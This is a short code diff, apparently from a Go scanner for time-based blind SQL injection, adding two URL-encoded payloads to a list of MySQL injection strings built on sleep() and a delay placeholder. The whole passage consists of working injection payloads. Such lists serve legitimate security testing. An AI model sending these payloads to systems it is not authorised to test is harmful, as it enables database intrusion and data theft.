@@ -107,6 +107,8 @@ func main() {
 	}
 
 	payloads := []string{
+		"if(now()=sysdate()%2Csleep(tempoSQLi)%2C0)",		
+		"0'XOR(if(now()=sysdate()%2Csleep(tempoSQLi)%2C0))XOR'Z",		
 		"0'XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR'Z",
 		"0\\\"XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR\\\"Z",
 		"1%20or%20sleep(tempoSQLi)#",
